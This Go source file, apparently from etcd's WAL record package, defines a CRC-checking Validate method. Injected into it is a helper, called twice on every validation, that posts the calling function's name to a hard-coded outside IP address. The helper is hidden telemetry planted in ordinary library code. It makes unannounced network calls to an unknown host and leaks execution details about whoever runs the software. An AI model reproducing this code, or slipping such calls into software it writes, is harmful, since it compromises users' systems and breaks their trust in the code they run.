package walpb

import (
	godefaultbytes "bytes"
	"errors"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

var (
	ErrCRCMismatch = errors.New("walpb: crc mismatch")
)

func (rec *Record) Validate(crc uint32) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if rec.Crc == crc {
		return nil
	}
	rec.Reset()
	return ErrCRCMismatch
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
